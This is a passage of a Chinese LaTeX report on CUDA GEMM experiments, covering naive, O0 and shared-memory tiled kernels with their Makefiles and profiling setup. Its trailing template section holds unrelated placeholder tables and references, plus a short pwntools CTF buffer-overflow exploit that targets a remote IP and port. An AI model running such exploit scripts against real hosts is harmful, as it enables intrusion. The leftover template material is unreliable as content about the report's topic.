\protect\texttt{verify.cu} 读入 \protect\texttt{N\{N\}.bin} 与 \protect\texttt{N\{N\}\_cref.bin}，启动 \protect\texttt{gemm\_launch} 后将 $C$ 读回主机，调用 \protect\texttt{mat\_max\_rel\_err} 与阈值 \protect\texttt{1e-10} 比较。\protect\texttt{bench.cu} 与 \protect\texttt{bench.sh} 负责性能测试：默认 \protect\texttt{warmup=3}、\protect\texttt{iters=10}、五档 $N$，用 \protect\texttt{cudaEvent} 仅包围 kernel 计时段，结果写入 \protect\texttt{results/bench\_detail.csv} 与 \protect\texttt{bench\_summary.csv}。\protect\texttt{gemm\_common.mk} 以变量 \protect\texttt{BLOCK}（默认 16）统一控制 \protect\texttt{check}、\protect\texttt{check-all}、\protect\texttt{bench-run}、\protect\texttt{ncu}、\protect\texttt{nsys} 的线程块边长；需使用其他块大小的实现（如共享内存版）在 include 前设 \protect\texttt{BLOCK=32} 即可。

\begin{lstlisting}[caption={校验与计时段（\protect\texttt{mat\_compare.c}、\protect\texttt{bench.cu} 节选）}]
const int ok = mat_max_rel_err(n, h_C, h_C_ref, 1e-12) <= tol;
for (int i = 0; i < iters; ++i) {
    cudaEventRecord(start);
    gemm_launch(n, d_A, d_B, d_C, block_dim, 0);
    cudaEventRecord(stop);
    cudaEventElapsedTime(&ms, start, stop);
}
\end{lstlisting}

Profiling 由 \protect\texttt{gemm\_common.mk} 统一配置：\protect\texttt{ncu} 使用 \protect\texttt{--set full}、\protect\texttt{--launch-skip 1 --launch-count 1}，\protect\texttt{NCU\_KERNEL} 默认为 \protect\texttt{IMPL\_NAME\_kernel}（如 \protect\texttt{gemm\_naive\_kernel}、\protect\texttt{gemm\_shared\_kernel}）；\protect\texttt{nsys} 使用 \protect\texttt{--trace=cuda,nvtx,osrt}、\protect\texttt{--cuda-memory-usage=true}、\protect\texttt{--stats=true}。规模取 $N=1024,2048,4096,8192$；\protect\texttt{ncu}/\protect\texttt{nsys} 版本见表~\ref{tab:exp-sw}。表~\ref{tab:naive-exp-cmd} 汇总主要 \protect\texttt{make} 目标。

\begin{table}[H]
\small
\centering
\caption{GEMM 实验主要 \protect\texttt{make} 目标}
\label{tab:naive-exp-cmd}
\begin{tabular}{P{2.8cm}P{2.6cm}P{6.4cm}}
\toprule
目标 & 作用 & 主要产出 \\
\midrule
\protect\texttt{make all} & 编译 \protect\texttt{bench}、\protect\texttt{verify\_gemm} & 可执行文件 \\
\protect\texttt{make check-all} & 五档 $N$ 正确性校验 & 终端 PASS/FAIL \\
\protect\texttt{make bench-run} & 性能测试 & \protect\texttt{results/bench\_*.csv} \\
\protect\texttt{make ncu[-N]} & Nsight Compute & \protect\texttt{profiling/*\_N\{N\}.ncu-rep} \\
\protect\texttt{make nsys[-N]} & Nsight Systems & \protect\texttt{profiling/*\_N\{N\}.nsys-rep}、\protect\texttt{.sqlite} \\
\bottomrule
\end{tabular}
\end{table}

\subsection{关闭编译器优化的朴素 GEMM 实现}

为考察编译器微优化（循环展开、FMA 融合等）的影响，于 \protect\texttt{final/gemm\_naive\_O0/} 在关闭优化选项下编译并测试同一朴素 kernel。实现位于 \protect\texttt{gemm\_naive/gemm\_naive.cu}，采用「一线程一输出」的并行方式：每个线程根据块索引与线程索引唯一确定 $C$ 中的一个元素 $C_{row,col}$，再在内层循环中对 $k=0,\ldots,N-1$ 从全局内存累加 $A_{row,k}\cdot B_{k,col}$。

线程与输出元素的对应关系如图~\ref{fig:gemm-naive-block} 所示。\protect\texttt{gemm\_launch} 将线程块配置为 $16\times16$，二维 grid 覆盖整个 $C$；对给定 \protect\texttt{blockIdx}、\protect\texttt{threadIdx}，有
\[
row = \protect\texttt{blockIdx.y}\times\protect\texttt{blockDim.y}+\protect\texttt{threadIdx.y},\quad
col = \protect\texttt{blockIdx.x}\times\protect\texttt{blockDim.x}+\protect\texttt{threadIdx.x}.
\]
图中示例 \protect\texttt{blockIdx}$=(2,1)$、\protect\texttt{threadIdx}$=(10,6)$ 的线程负责计算 $C_{22,42}$。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.92\textwidth]{plots/gemm_naive_block.png}
    \caption{朴素 GEMM 中线程块与输出矩阵 $C$ 的映射关系（\protect\texttt{blockDim}$=16\times16$）}
    \label{fig:gemm-naive-block}
\end{figure}

对单个输出 $C_{row,col}$，该线程需读取 $A$ 的第 $row$ 行与 $B$ 的第 $col$ 列，如图~\ref{fig:gemm-naive-data} 所示。数学上即 $C_{row,col}=\sum_k A_{row,k}B_{k,col}$；数据全部来自全局内存，且访问 $B$ 时步长为 $N$，同一 warp 内难以形成连续合并访存。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.88\textwidth]{plots/gemm_naive_data.png}
    \caption{计算 $C_{22,42}$ 的线程所访问的 $A$ 行与 $B$ 列（朴素实现）}
    \label{fig:gemm-naive-data}
\end{figure}

核心 kernel 与启动代码如下：

\begin{lstlisting}[caption={朴素 GEMM kernel 与启动（\protect\texttt{gemm\_naive.cu}）}]
__global__ void gemm_naive_kernel(int n, const double *A,
                                  const double *B, double *C) {
    const int row = blockIdx.y * blockDim.y + threadIdx.y;
    const int col = blockIdx.x * blockDim.x + threadIdx.x;
    if (row >= n || col >= n) return;
    double sum = 0.0;
    for (int k = 0; k < n; ++k)
        sum += A[row * n + k] * B[k * n + col];
    C[row * n + col] = sum;
}

void gemm_launch(int n, const double *d_A, const double *d_B,
                 double *d_C, dim3 block_dim, cudaStream_t stream) {
    const dim3 grid_dim(
        (unsigned)((n + block_dim.x - 1) / block_dim.x),
        (unsigned)((n + block_dim.y - 1) / block_dim.y));
    gemm_naive_kernel<<<grid_dim, block_dim, 0, stream>>>(
        n, d_A, d_B, d_C);
}
\end{lstlisting}

\protect\texttt{gemm\_naive\_O0/Makefile} 引用上述源码并覆盖 \protect\texttt{NVCCFLAGS}；\protect\texttt{NCU\_KERNEL} 显式设为 \protect\texttt{gemm\_naive\_kernel}：

\begin{lstlisting}[caption={O0 目录 Makefile（\protect\texttt{gemm\_naive\_O0/Makefile}）}]
KERNEL_SRC = ../gemm_naive/gemm_naive.cu
IMPL_NAME = gemm_naive_O0
NCU_KERNEL = gemm_naive_kernel
include ../util/gemm_common.mk
NVCCFLAGS = -O0 -std=c++11 -Xcompiler -Wall,-Wextra \
            -Xptxas -O0 --fmad=false
\end{lstlisting}

在实验节点单卡（\protect\texttt{CUDA\_VISIBLE\_DEVICES=0}）下执行：

\begin{lstlisting}[language=bash, caption={O0 实验命令}]
cd final/gemm_naive_O0
make all && make check-all && make bench-run
make ncu && make nsys
\end{lstlisting}

产出前缀为 \protect\texttt{gemm\_naive\_O0}（\protect\texttt{results/}、\protect\texttt{profiling/gemm\_naive\_O0\_N\{N\}.*}）。

\subsection{开启编译器优化的朴素 GEMM 实现}

对照实验在 \protect\texttt{final/gemm\_naive/} 使用同一 \protect\texttt{gemm\_naive.cu}（并行映射与访存方式见上一节图~\ref{fig:gemm-naive-block}、图~\ref{fig:gemm-naive-data}），采用 \protect\texttt{gemm\_common.mk} 默认的 \protect\texttt{-O3} 编译选项，\protect\texttt{IMPL\_NAME=gemm\_naive}：

\begin{lstlisting}[caption={O3 目录 Makefile（\protect\texttt{gemm\_naive/Makefile}）}]
KERNEL_SRC = gemm_naive.cu
include ../util/gemm_common.mk
\end{lstlisting}

校验、benchmark 与 profiling 流程与上一节相同，在 \protect\texttt{final/gemm\_naive/} 下执行同样的 \protect\texttt{make} 命令即可；产出前缀为 \protect\texttt{gemm\_naive}。两版朴素实验共用同一组测试数据与辅助代码，供下一章对比编译器优化及 profiling 指标。

\subsection{共享内存分块 GEMM 实现}

朴素 kernel 在计算 $C_{row,col}$ 时需访问 $A$ 的整行与 $B$ 的整列（见图~\ref{fig:gemm-naive-data}），且数据均来自全局内存。共享内存分块实现在保持「一线程一输出」映射不变（见图~\ref{fig:gemm-naive-block}）的前提下，沿 $k$ 维将上述行、列拆成长度为 $T$ 的片段：每个线程块在每一轮只从全局内存协作装载 $A$、$B$ 的 $T\times T$ 子块到块内共享内存，块内线程从共享内存读取本片段完成部分积累加，再进入下一轮。共享内存的作用域限于当前线程块（见图~\ref{fig:nvidia-cuda-memory-hierarchy}），块间互不共享。

本实验取 $T=32$，线程块配置为 $32\times32$（共 1024 线程，为单块线程数上限）。每个线程块使用两块 $T\times T$ 的 \protect\texttt{double} 缓冲区 \protect\texttt{As}、\protect\texttt{Bs}，通过动态共享内存申请，规模为 $2T^2\times 8\,\mathrm{B}=16\,\mathrm{KiB}$，低于 Tesla V100 每块 48 KiB 的共享内存上限。图~\ref{fig:gemm-shared-usage} 以 $N=128$、$T=32$ 为例说明一次 $k$ 向迭代（图中 $t=0$）的数据流：负责 $C$ 中 tile $(1,2)$ 的线程块满足 \protect\texttt{blockIdx}$=(2,1)$（即 \protect\texttt{blockIdx.x}$=2$、\protect\texttt{blockIdx.y}$=1$），其输出对应 $C$ 的行 $32\ldots63$、列 $64\ldots95$。在该轮中，块内线程协作自全局内存装入 $A$ 的子块 \protect\texttt{A(1,0)}（$A$ 行 $32\ldots63$、列 $0\ldots31$）至 \protect\texttt{As[32][32]}，同时装入 $B$ 的子块 \protect\texttt{B(0,2)}（$B$ 行 $0\ldots31$、列 $64\ldots95$）至 \protect\texttt{Bs[32][32]}；\protect\texttt{\_\_syncthreads()} 后各线程用 \protect\texttt{As} 中本行片段与 \protect\texttt{Bs} 中本列片段完成 $k=0\ldots31$ 的部分乘加。随后 $t=1,2,3$ 时沿 $k$ 轴右移/下移，依次装载 \protect\texttt{A(1,1)}、\protect\texttt{B(1,2)} 等子块并累加，直至覆盖整个 $k$ 维。实际实验的 $N$ 更大，但单块内的装载—计算—同步模式相同。

\begin{figure}[H]
    \centering
    \includegraphics[width=0.95\textwidth]{plots/gemm_shared_usage.png}
    \caption{共享内存分块 GEMM：单个 $32\times32$ 输出块的数据装载示意（$N=128$，\protect\texttt{blockIdx}$=(2,1)$，$t=0$ 时装入 \protect\texttt{A(1,0)} 与 \protect\texttt{B(0,2)}）}
    \label{fig:gemm-shared-usage}
\end{figure}

对第 $t$ 个 $k$ 向分块，\protect\texttt{As} 存放 $A$ 中本输出块行范围、列下标 $tT\ldots(t{+}1)T{-}1$ 的子矩阵；\protect\texttt{Bs} 存放 $B$ 中行下标 $tT\ldots(t{+}1)T{-}1$、列范围对应本输出块列的子矩阵。装载后两次调用 \protect\texttt{\_\_syncthreads()} 分别保证数据就绪与下一轮覆写前计算完成；越界位置填 0 以处理 $N$ 非 $T$ 整数倍的情形。

对负责 $C_{row,col}$ 的线程，数学上仍需求 $\sum_k A_{row,k}B_{k,col}$，但在每个 $k$ 块内改为从 \protect\texttt{As} 读取 $A_{row,\,tT+k}$、从 \protect\texttt{Bs} 读取 $B_{tT+k,\,col}$（$k=0,\ldots,T{-}1$），在共享内存上完成长度为 $T$ 的内积并累加到寄存器中的 \protect\texttt{sum}。子块中每个元素自全局内存仅读取一次，却可供块内至多 $T$ 个线程复用，从而降低全局访存次数；块内乘加则利用片上共享内存的低延迟。

实现位于 \protect\texttt{final/gemm\_shared/gemm\_shared.cu}，核心 kernel 如下：

\begin{lstlisting}[caption={共享内存分块 GEMM（\protect\texttt{gemm\_shared.cu}）}]
__global__ void gemm_shared_kernel(int n, const double *A,
                                   const double *B, double *C) {
    const int tx = threadIdx.x;
    const int ty = threadIdx.y;
    const int tile = blockDim.x;
    const int row = blockIdx.y * tile + ty;
    const int col = blockIdx.x * tile + tx;
    extern __shared__ double shared_mem[];
    double *As = shared_mem;
    double *Bs = shared_mem + tile * tile;
    double sum = 0.0;
    const int num_tiles = (n + tile - 1) / tile;
    for (int t = 0; t < num_tiles; ++t) {
        const int a_col = t * tile + tx;
        const int a_row = blockIdx.y * tile + ty;
        As[ty * tile + tx] =
            (a_row < n && a_col < n) ? A[a_row * n + a_col] : 0.0;
        const int b_row = t * tile + ty;
        const int b_col = blockIdx.x * tile + tx;
        Bs[ty * tile + tx] =
            (b_row < n && b_col < n) ? B[b_row * n + b_col] : 0.0;
        __syncthreads();
        for (int k = 0; k < tile; ++k)
            sum += As[ty * tile + k] * Bs[k * tile + tx];
        __syncthreads();
    }
    if (row < n && col < n)
        C[row * n + col] = sum;
}
\end{lstlisting}

\protect\texttt{gemm\_launch} 按 \protect\texttt{block\_dim} 配置二维 grid，并申请 $2\times\protect\texttt{block\_dim.x}\times\protect\texttt{block\_dim.y}$ 字节的动态共享内存：

\begin{lstlisting}[caption={共享内存 kernel 启动（\protect\texttt{gemm\_shared.cu}）}]
const size_t shmem_bytes =
    2 * block_dim.x * block_dim.y * sizeof(double);
gemm_shared_kernel<<<grid_dim, block_dim, shmem_bytes, stream>>>(
    n, d_A, d_B, d_C);
\end{lstlisting}

\protect\texttt{gemm\_shared/Makefile} 在 \protect\texttt{include} 前设 \protect\texttt{BLOCK=32}，由 \protect\texttt{gemm\_common.mk} 统一传入各 \protect\texttt{make} 目标；编译选项沿用默认 \protect\texttt{-O3}，\protect\texttt{IMPL\_NAME=gemm\_shared}，\protect\texttt{NCU\_KERNEL} 自动为 \protect\texttt{gemm\_shared\_kernel}：

\begin{lstlisting}[caption={共享内存目录 Makefile（\protect\texttt{gemm\_shared/Makefile}）}]
KERNEL_SRC = gemm_shared.cu
BLOCK = 32
include ../util/gemm_common.mk
\end{lstlisting}

在实验节点单卡下执行：

\begin{lstlisting}[language=bash, caption={共享内存 GEMM 实验命令}]
cd final/gemm_shared
make all && make check-all && make bench-run
make ncu && make nsys
\end{lstlisting}

产出前缀为 \protect\texttt{gemm\_shared}（\protect\texttt{results/}、\protect\texttt{profiling/gemm\_shared\_N\{N\}.*}）。与朴素实现共用同一组测试数据与 \protect\texttt{util/} 辅助代码；定量对比见第~\ref{sec:exp-result} 节。


\section{实验结果与分析}
\label{sec:exp-result}






\section{示例：结论}

以下是结论

\subsection{实验结果}

这是一个表格，还有一个\href{https://blog.csdn.net/qq_40721108/article/details/134424063}{在Latex中插入链接}。

\begin{table}[H]
\small
\caption{三线表使用实例}
\centering
\begin{tabular}{cccccc}
\hline  
表头1 & 表头2 & 表头3 & 表头4 & 表头5 & 表头6 \\ 
\hline  
数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
\hline
\end{tabular} 
\end{table}

\subsection{实验结论}

这里是图片。

\begin{figure}[H] %H为当前位置，!htb为忽略美学标准，htbp为浮动图形
    \centering %图片居中
    \includegraphics[width=0.8\textwidth]{example-image-2.png} %插入图片，[]中设置图片大小，{}中是图片文件名
    \caption{example\_caption} %最终文档中希望显示的图片标题
    \label{example_label} %用于文内引用的标签
\end{figure}

% 2*2四张子图示意
\begin{figure}[htbp]
  \begin{subfigure}{0.48\textwidth}
    \includegraphics[width=\linewidth]{example-image-1.png}
    \caption{示意图1} \label{fig:8a}
  \end{subfigure}%
  \hspace*{\fill}   % maximize separation between subfigures
  \begin{subfigure}{0.48\textwidth}
    \includegraphics[width=\linewidth]{example-image-1.png}
    \caption{示意图2} \label{fig:8b}
  \end{subfigure}\\
  %\hspace*{\fill}   % maximizeseparation between subfigures
  \begin{subfigure}{0.48\textwidth}
    \includegraphics[width=\linewidth]{example-image-1.png}
    \caption{示意图3} \label{fig:8c}
  \end{subfigure}
  \hspace*{\fill}   % maximize separation between subfigures
  \begin{subfigure}{0.48\textwidth}
    \includegraphics[width=\linewidth]{example-image-1.png}
    \caption{示意图4} \label{fig:8d}
  \end{subfigure}
\caption{2*2四张子图示意} \label{fig:8}
\end{figure}

\section{代码}

下面是一段Python代码。
\begin{lstlisting}[language=Python,title={ans002.py}]
from pwn import* #可能会报错 ，试试 python3  
p = remote('111.200.241.244',49686)
payload = 'a'*4 + p64(1853186401).decode("iso-8859-1") #本来没有后面的编码来着
p.recvuntil("lets get helloworld for bof\n")
p.sendline(payload)
p.interactive()
\end{lstlisting}

下面是从文件导入的C代码。
\lstinputlisting[language=C, title=test.c]{include_code/test.c}

\end{spacing}

\newpage

% XSP 2023/3/16: bib支持不全，暂时改为手动
\section*{参考文献} % section*生成无标号章节题目
\hypersetup{urlcolor=black}
\addcontentsline{toc}{section}{参考文献} % 将无标号章节添加至目录
% 著作: [序号]作者．书名[标识码]．出版地：出版社，出版年．
[1]张志建．严复思想研究[M]．桂林：广西师范大学出版社，1989． 

% 译著: [序号]国名或地区（用圆括号）原作者．书名[标识码]．译者．出版地：出版社，出版年．
[2]（英）霭理士．性心理学[M]．潘光旦译．北京：商务印书馆，1997．

% 古典文献 文史古籍类引文后加序号，再加圆括号，内加注书名、篇名

% 论文集: [序号]编者．书名[标识码]．出版地：出版社，出版年．
[3]伍蠡甫．西方论文选（下册）[C]．上海：上海译文出版社，1979．

% 期刊文章: [序号]作者．篇名[标识码]．刊名，年，（期）．
[4]叶朗．《红楼梦》的意蕴[J]．北京大学学报（哲学社会科学版），1989，（2）

% 报纸文章: [序号]作者．篇名[标识码]．报纸名，出版日期（版次）
[5]谢希德．创造学习的新思路[N]．人民日报，1998-12-25（10）

% 外文文献: 要求外文文献所表达的信息和中文文献一样多，但文献类型标识码可以不标出。
[6]Mansfeld, R.S. \& Busse. \textit{T.V. The Psychology of creativity and discovery}, Chinago：
NelsonHall, 1981

[7]NVIDIA A100 Tensor Core GPU Architecture. Available: \url{https://images.nvidia.com/aem-dam/en-zz/Solutions/data-center/nvidia-ampere-architecture-whitepaper.pdf}

% \begingroup
% \setstretch{2.0}    %行距2
% \setlength{\bibsep}{0pt}    %段前段后0
% \begin{adjustwidth}{0.42cm}{0.42cm} %左右缩进0.42cm
% \bibliography{references}
% \end{adjustwidth}
% \endgroup

\end{document}
